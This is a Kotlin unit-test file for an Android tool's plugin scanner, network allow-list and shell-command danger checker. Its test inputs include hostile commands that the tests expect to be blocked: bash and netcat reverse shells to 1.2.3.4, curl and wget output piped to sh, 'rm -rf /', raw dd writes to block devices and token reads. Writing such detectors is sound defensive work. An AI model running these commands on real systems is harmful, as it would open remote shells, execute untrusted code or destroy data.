package com.matchi.tool

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class PluginScanTest {
    private fun codes(src: String) = scanPlugin(src, emptyList()).findings.map { it.code }.toSet()

    @Test fun cleanCodeHasNoFindings() {
        val r = scanPlugin("var a = 1; console.log('hi')", emptyList())
        assertEquals("ok", r.risk)
        assertTrue(r.findings.isEmpty())
    }

    @Test fun plainNetworkUseIsOnlyInformation() {
        val r = scanPlugin("fetch('/api/ping')", emptyList())
        assertEquals("ok", r.risk)
        assertEquals(setOf("net"), r.findings.map { it.code }.toSet())
    }

    @Test fun clearlyMaliciousCodeIsBlocked() {
        for (src in listOf(
            "sessionStorage.getItem('matchi_token')",
            "eval(atob('aGk='))",
            "api('/api/shell',{cmd:'bash -i >& /dev/tcp/1.2.3.4/9 0>&1'})",
            "nc 1.2.3.4 9 -e /system/bin/sh",
            "curl -s http://x/y.sh | sh",
            "wget -qO- http://x | su -c sh",
            "cmd: 'rm -rf /'",
            "rm -rf /data/*\"",
            "pm uninstall com.matchi.tool",
            "dd if=/x of=/dev/block/mmcblk0p1",
        )) assertTrue(src, scanPlugin(src, emptyList()).blocked)
    }

    @Test fun ordinaryRootCommandsAreNotBlocked() {
        for (src in listOf(
            "rm -rf /data/local/tmp/myplug",
            "rm -rf /data/local/matchitool/plugin_data/foo",
            "dd if=/dev/zero of=/sdcard/big.bin bs=1M count=1",
            "curl -o /data/local/tmp/x.bin https://github.com/a/b",
        )) assertFalse(src, scanPlugin(src, emptyList()).blocked)
    }

    @Test fun warnsAboutDynamicCodeAndCookies() {
        assertTrue(codes("eval(code)").contains("eval"))
        assertTrue(codes("var c = document.cookie").contains("cookie"))
        assertEquals("warn", scanPlugin("eval(code)", emptyList()).risk)
    }

    @Test fun longBlobWarnsButAnEmbeddedImageDoesNot() {
        assertTrue(codes("var x='" + "A".repeat(500) + "'").contains("blob"))
        assertFalse(codes("src='data:image/png;base64," + "A".repeat(2000) + "'").contains("blob"))
    }

    @Test fun unknownHostsWarnUntilAllowed() {
        val src = "fetch('https://evil.example.org/x')"
        val r = scanPlugin(src, emptyList())
        assertEquals(listOf("evil.example.org"), r.hosts)
        assertEquals("warn", r.risk)
        assertEquals("ok", scanPlugin(src, listOf("evil.example.org")).risk)
        assertEquals("ok", scanPlugin("fetch('https://api.ipify.org')", emptyList()).risk)
        assertEquals("ok", scanPlugin("xmlns='http://www.w3.org/2000/svg'", emptyList()).risk)
    }
}

class NetPolicyTest {
    @Test fun acceptsHostsPortsSchemesAndWildcards() {
        assertEquals("api.example.com", NetPolicy.cleanEntry("  API.Example.com "))
        assertEquals("192.168.0.1:8080", NetPolicy.cleanEntry("192.168.0.1:8080"))
        assertEquals("http://nas.local", NetPolicy.cleanEntry("http://nas.local"))
        assertEquals("*.mycdn.net", NetPolicy.cleanEntry("*.mycdn.net"))
    }

    @Test fun refusesAnythingBroadOrOdd() {
        for (e in listOf("", "*", "*.com", "http:", "https:", "data:", "http://", "a b", "x;y", "evil.com/path", "'self'", "a..b", "-a.com", "a.com'"))
            assertNull(e, NetPolicy.cleanEntry(e))
    }

    @Test fun matchesHostsAndSubdomains() {
        val list = listOf("a.com", "*.cdn.net", "http://b.org:81")
        assertTrue(NetPolicy.hostAllowed("a.com", list))
        assertTrue(NetPolicy.hostAllowed("x.cdn.net", list))
        assertTrue(NetPolicy.hostAllowed("b.org", list))
        assertFalse(NetPolicy.hostAllowed("evil.a.com", list))
        assertFalse(NetPolicy.hostAllowed("cdn.net", list))
    }

    @Test fun strictPolicyListsOnlyTheAllowedHosts() {
        val csp = NetPolicy.csp(listOf("api.example.com"), true)
        assertTrue(csp.contains("connect-src 'self' raw.githubusercontent.com"))
        assertTrue(csp.contains("api.example.com"))
        assertFalse(csp.contains(" http:"))
        assertFalse(csp.contains(" https:"))
        assertTrue(csp.contains("form-action 'self'") && csp.contains("frame-ancestors 'none'"))
    }

    @Test fun openPolicyKeepsTheOldBehaviour() {
        val csp = NetPolicy.csp(emptyList(), false)
        assertTrue(csp.contains("connect-src 'self' http: https:"))
        assertTrue(csp.contains("img-src 'self' data: blob: https:"))
    }

    @Test fun badSavedListsGiveAnEmptyList() {
        assertEquals(emptyList<String>(), NetPolicy.parse("not json"))
        assertEquals(listOf("a.com"), NetPolicy.parse("[\"a.com\",\"*.com\"]"))
    }
}

class ShellDangerTest {
    @Test fun remoteShellsAndPipedDownloadsAreRefusedFromAnySource() {
        for (fromPlugin in listOf(false, true)) {
            assertNotNull(shellDanger("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", fromPlugin))
            assertNotNull(shellDanger("curl http://x | sh", fromPlugin))
            assertNotNull(shellDanger("rm -rf /", fromPlugin))
            assertNotNull(shellDanger("rm -rf '/'", fromPlugin))
            assertNotNull(shellDanger("rm -rf /data/*", fromPlugin))
            assertNotNull(shellDanger("pm uninstall com.matchi.tool", fromPlugin))
        }
    }

    @Test fun diskAndSystemWritesAreRefusedOnlyForPlugins() {
        for (c in listOf("dd if=/x of=/dev/block/mmcblk0p5", "mount -o remount,rw /system", "echo x > /system/build.prop"))
            { assertNotNull(c, shellDanger(c, true)); assertNull(c, shellDanger(c, false)) }
    }

    @Test fun everydayCommandsPass() {
        for (c in listOf("sendat -n 1 'AT+CSQ'", "cat /system/build.prop", "rm -rf /data/local/tmp/x", "rm -rf /data/local/matchitool/plugin_data/foo",
            "iptables -A INPUT -p tcp --dport 80 -j ACCEPT", "nc -z 127.0.0.1 80", "curl -o /data/local/tmp/x.bin https://h/x"))
            assertNull(c, shellDanger(c, true))
    }
}
